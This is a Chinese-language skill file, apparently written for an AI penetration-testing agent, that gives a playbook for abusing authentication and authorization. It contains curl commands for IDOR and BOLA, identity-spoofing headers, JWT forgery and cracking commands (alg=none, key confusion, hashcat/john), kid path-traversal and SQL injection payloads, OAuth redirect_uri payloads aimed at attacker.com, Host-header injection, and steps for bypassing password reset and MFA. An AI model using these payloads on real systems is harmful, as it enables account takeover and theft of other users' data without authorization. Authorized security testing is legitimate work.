---
name: authz-token-abuse
description: 认证与会话令牌攻防（越权/IDOR/BOLA、JWT 全攻击面、OAuth-OIDC 缺陷、Session 与密码重置链、MFA 绕过）。当意图涉及"越权""换个用户身份""令牌伪造""登录绕过""重置密码"时读本 skill。
---
# 认证与授权 Abuse Playbook

> 核心心法：**先建立身份矩阵，再找矩阵里的洞**。授权类漏洞靠"系统性枚举"赢，不靠灵感。

## 0. 建身份矩阵（最重要的一步）

至少准备 **3 个不同权限身份**：匿名 / 普通用户A / 普通用户B（有第二高权限账号更好）。

然后把每个业务接口 × 每个身份跑一遍，记录一行：

| 接口 | 方法 | 匿名 | 用户A | 用户B | 结论 |
|---|---|---|---|---|---|
| /api/order/{id} | GET | 401 | 200(自己的) | **200(别人的)** | BOLA |
| /api/admin/users | GET | 401 | **200** | 403 | 垂直越权 |

**这一步就能挖出企业应用里 40% 以上的高危**，且不需要任何 payload 技巧。把矩阵存进本次任务的 run 目录，别只放脑子里。

## 1. 越权 / IDOR / BOLA

```bash
# 横向：拿 A 的 token 访问 B 的资源
curl -si -H "Authorization: Bearer $TOKEN_A" http://TARGET/api/order/$ID_B

# ID 形态逐个试（同一接口）
1 / 2 / 1001    # 递增
uuid            # 换随机 uuid 看是否 403 或 404（404=不泄露存在性，未必安全）
base64 编号      # eyJpZCI6MX0= → 解码改 id 再编回
哈希/短链        # 尝试改大小写、改末位

# 隐藏身份载体（前端不显示但后端认）
X-User-Id: 2
X-Org-Id: 99
?userId=2  &tenantId=1  &role=admin
Cookie: uid=2; isAdmin=1
```
**盲点清单**：批量接口（`?ids=1,2,3`）、导出接口（`/export?filter=all`）、WebSocket 消息体里的 userId、GraphQL 变量里的 id、多层嵌套资源（`/org/1/user/2` 只校验 org）。

## 2. JWT 全攻击面

先解结构：`header.payload.signature` → base64url 解码看 `alg`、`kid`、`jku`、`typ`、claims。

| 攻击 | 触发条件 | 做法 |
|---|---|---|
| **alg=none** | 后端未绑定算法 | header 改 `{"alg":"none"}`，签名段留空或删掉 |
| **算法混淆** | 后端用公钥验 RSA | 取公钥当 HMAC 密钥，改 `alg`→`HS256` 重签 |
| **弱密钥爆破** | HS256 且密钥弱 | `hashcat -m 16500 jwt.txt rockyou.txt`；`john --format=HMAC-SHA256` |
| **kid 注入** | kid 参与文件/SQL 读取 | `"kid":"../../../../etc/passwd"`、`"kid":"1' UNION SELECT 'secret'--"` |
| **jku/x5u 劫持** | 后端信任 header 里的 URL | 指向自己的 JWKS 服务器，塞自己的公钥 |
| **claim 篡改** | 只验签不验内容 | `role:admin`、`sub:1`、`is_staff:true`、`exp` 延长 |
| **嵌入对象** | 有些库把 payload 反序列化 | `admin:{"$ne":null}`、`role:["admin"]` |

```bash
# 无密钥时的顺手检查
python3 -c "import base64,json,sys;d=open('jwt.txt').read().split('.');print(base64.urlsafe_b64decode(d[0]+'=='),base64.urlsafe_b64decode(d[1]+'=='))"

# HS256 爆破（容器内有 hashcat/john）
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt 2>/dev/null || \
john --wordlist=/usr/share/dirb/wordlists/common.txt --format=HMAC-SHA256 jwt.txt
```

## 3. OAuth / OIDC 缺陷

| 检查点 | 怎么打 |
|---|---|
| **redirect_uri 校验** | 改 `redirect_uri`：加 `@attacker.com`、路径穿越 `/cb/../..`、子域 `evil.target.com`、`?next=` 二次跳转、`javascript:`、开放重定向链 |
| **state 缺失/可预测** | 不传 state 完成流程 → CSRF 绑定攻击；重复 state 复用 |
| **code 复用 / 无时效** | 同一 code 换两次 token |
| **PKCE 降级** | 服务端不校验 `code_verifier` 时直接省掉 |
| **scope 提权** | 请求时加 `scope=admin`、把 `read` 改成 `read write` |
| **token 泄露面** | implicit 流的 fragment、referer 里的 code、日志/截图 |
| **账号接管链** | 未验证邮箱即可绑定 → 用他人邮箱注册 → 再用 IdP 登录 |

## 4. Session 与 Cookie

- Cookie 里塞的是可预测 ID？（时间戳、自增、md5(用户名)）
- 登出后旧 token 仍有效？改密码后其它会话不失效？
- **会话固定**：登录前给自己设一个 SID，登录后仍用同一个 → 说明未轮换
- `HttpOnly`/`Secure`/`SameSite` 缺失 → 配合 XSS 提权
- Cookie 作用域过宽（`.target.com` + 子域可控）

## 5. 密码重置 / 账号找回链

这是逻辑漏洞高发区，逐条过：

1. 重置 token 是否可预测（短、时间戳、md5(email)）
2. token 是否与用户绑定（拿 A 的 token 重置 B）
3. **Host 头注入**：`Host: attacker.com` → 邮件里的链接指向攻击者
4. 响应里泄露 token（`{"code":"123456"}` 直接给前端）
5. 验证码暴力：无次数限制 + 4-6 位数字 → 直接爆破
6. 步骤跳过：直接请求"第 3 步"提交新密码
7. 邮箱/手机号大小写与前后空格不一致导致归属错乱
8. 并发同一 token 重置两个账号（竞态）

## 6. MFA 绕过

- 验证码无次数限制 → 爆破（注意锁定策略）
- 响应包替换：`{"mfa_required":false}`
- 先完成登录拿到低权限 session，MFA 只是前端拦截 → 直接访问受保护接口
- 备用码/恢复码泄露、可预测
- MFA 验证接口与登录接口绑定不一致（用 A 的 challenge 验证 B 的登录）

## 7. 判定与写回

- **BOLA/IDOR 成立**：必须有"同一请求、换身份、结果不同"的成对证据（A 拿到 B 的数据原文）。
- **JWT 伪造成立**：给出伪造后的 token 与被接受的真实响应。
- 只把"接口没鉴权"和"接口没鉴权且能改数据"区分清楚：前者是信息泄露，后者才是严重越权。
- 矩阵建完但没打成 → `record_fact` 记矩阵结论（哪些接口已测、结论如何），避免重复劳动。
